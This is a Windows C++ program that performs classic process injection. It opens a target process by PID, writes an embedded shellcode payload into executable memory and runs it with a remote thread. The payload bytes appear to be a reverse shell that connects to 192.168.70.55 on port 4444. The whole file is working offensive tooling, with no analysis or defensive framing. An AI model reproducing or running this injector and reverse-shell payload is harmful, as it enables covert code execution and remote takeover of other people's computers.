// ProcessInjection.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <iostream>
#include <windows.h>

#define okay(mesg, ...) printf("[+] " mesg "\n", ##__VA_ARGS__)
#define warn(mesg, ...) printf("[!] " mesg "\n", ##__VA_ARGS__)
#define info(mesg, ...) printf("[-] " mesg "\n", ##__VA_ARGS__)



int main(int argc, char* argv[])
{
    // Setup variables
    DWORD dwPID = NULL; DWORD dwTID = NULL;
    HANDLE hProcess = NULL; HANDLE hThread = NULL;
    PVOID rBuffer = NULL;

    // Check correct usage
    if (argc < 2) {
        warn("Supply a PID as the first argument");
        return EXIT_FAILURE;
    }

    // Get a handle on supplied PID
    info("Trying to get handle on PID %ld", dwPID);

    dwPID = atoi(argv[1]);
    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID);

    if (hProcess == NULL)
    {
        warn("Could not get handle on process with PID %ld. Error: 0x%lx", dwPID, GetLastError());
        return EXIT_FAILURE;
    }

    okay("Got a handle: 0x%p", hProcess);

    // Allocate memory in process
    info("Trying to allocate memory in process %ld", dwPID);

    unsigned char payload[] =
        "\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51\x41\x50"
        "\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
        "\x18\x48\x8b\x52\x20\x4d\x31\xc9\x48\x8b\x72\x50\x48\x0f"
        "\xb7\x4a\x4a\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
        "\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x48\x8b\x52\x20\x8b"
        "\x42\x3c\x48\x01\xd0\x41\x51\x66\x81\x78\x18\x0b\x02\x0f"
        "\x85\x72\x00\x00\x00\x8b\x80\x88\x00\x00\x00\x48\x85\xc0"
        "\x74\x67\x48\x01\xd0\x44\x8b\x40\x20\x49\x01\xd0\x8b\x48"
        "\x18\x50\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6"
        "\x4d\x31\xc9\x48\x31\xc0\x41\xc1\xc9\x0d\xac\x41\x01\xc1"
        "\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8"
        "\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44"
        "\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41"
        "\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83"
        "\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9"
        "\x4b\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33\x32\x00"
        "\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00\x00\x49"
        "\x89\xe5\x49\xbc\x02\x00\x11\x5c\xc0\xa8\x46\x37\x41\x54"
        "\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5"
        "\x4c\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29\x80\x6b"
        "\x00\xff\xd5\x6a\x0a\x41\x5e\x50\x50\x4d\x31\xc9\x4d\x31"
        "\xc0\x48\xff\xc0\x48\x89\xc2\x48\xff\xc0\x48\x89\xc1\x41"
        "\xba\xea\x0f\xdf\xe0\xff\xd5\x48\x89\xc7\x6a\x10\x41\x58"
        "\x4c\x89\xe2\x48\x89\xf9\x41\xba\x99\xa5\x74\x61\xff\xd5"
        "\x85\xc0\x74\x0a\x49\xff\xce\x75\xe5\xe8\x93\x00\x00\x00"
        "\x48\x83\xec\x10\x48\x89\xe2\x4d\x31\xc9\x6a\x04\x41\x58"
        "\x48\x89\xf9\x41\xba\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00"
        "\x7e\x55\x48\x83\xc4\x20\x5e\x89\xf6\x6a\x40\x41\x59\x68"
        "\x00\x10\x00\x00\x41\x58\x48\x89\xf2\x48\x31\xc9\x41\xba"
        "\x58\xa4\x53\xe5\xff\xd5\x48\x89\xc3\x49\x89\xc7\x4d\x31"
        "\xc9\x49\x89\xf0\x48\x89\xda\x48\x89\xf9\x41\xba\x02\xd9"
        "\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58\x41\x57\x59\x68"
        "\x00\x40\x00\x00\x41\x58\x6a\x00\x5a\x41\xba\x0b\x2f\x0f"
        "\x30\xff\xd5\x57\x59\x41\xba\x75\x6e\x4d\x61\xff\xd5\x49"
        "\xff\xce\xe9\x3c\xff\xff\xff\x48\x01\xc3\x48\x29\xc6\x48"
        "\x85\xf6\x75\xb4\x41\xff\xe7\x58\x6a\x00\x59\x49\xc7\xc2"
        "\xf0\xb5\xa2\x56\xff\xd5";

    size_t payloadSize = sizeof(payload);

    rBuffer = VirtualAllocEx(
        hProcess,
        NULL,
        payloadSize,
        (MEM_COMMIT | MEM_RESERVE),
        PAGE_EXECUTE_READWRITE
    );

    if (rBuffer == NULL)
    {
        warn("Could not allocate memory in process %ld, error: 0x%lx", dwPID, GetLastError());
        return EXIT_FAILURE;
    }

    okay("Reserved and commited %zd bytes to memory", payloadSize);

    // Writing payload to allocated memory

    if (!WriteProcessMemory(
        hProcess,
        rBuffer,
        payload,
        payloadSize,
        NULL
    ))
    {
        warn("Could not write payload to process memory, error: 0x%lx", GetLastError());
        return EXIT_FAILURE;
    }

    okay("Wrote payload to process memory");

    // Creating remote thread
    info("Creating remote thread and executing it");

    hThread = CreateRemoteThreadEx(
        hProcess,
        NULL,
        0,
        (LPTHREAD_START_ROUTINE)rBuffer,
        NULL,
        0,
        0,
        &dwTID
    );

    if (hThread == NULL)
    {
        warn("Could not create or execute thread, error: 0x%lx", GetLastError());
        return EXIT_FAILURE;
    }

    okay("Succesfully created thread with TID %ld and handle 0x%p", dwTID, hThread);
    info("Waiting on execution of thread %ld", dwTID);
    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);
    okay("Thread %ld has finished executing", dwPID);
    okay("Goodbye!");

    return EXIT_SUCCESS;
}

// Run program: Ctrl + F5 or Debug > Start Without Debugging menu
// Debug program: F5 or Debug > Start Debugging menu

// Tips for Getting Started: 
//   1. Use the Solution Explorer window to add/manage files
//   2. Use the Team Explorer window to connect to source control
//   3. Use the Output window to see build output and other messages
//   4. Use the Error List window to view errors
//   5. Go to Project > Add New Item to create new code files, or Project > Add Existing Item to add existing code files to the project
//   6. In the future, to open this project again, go to File > Open > Project and select the .sln file
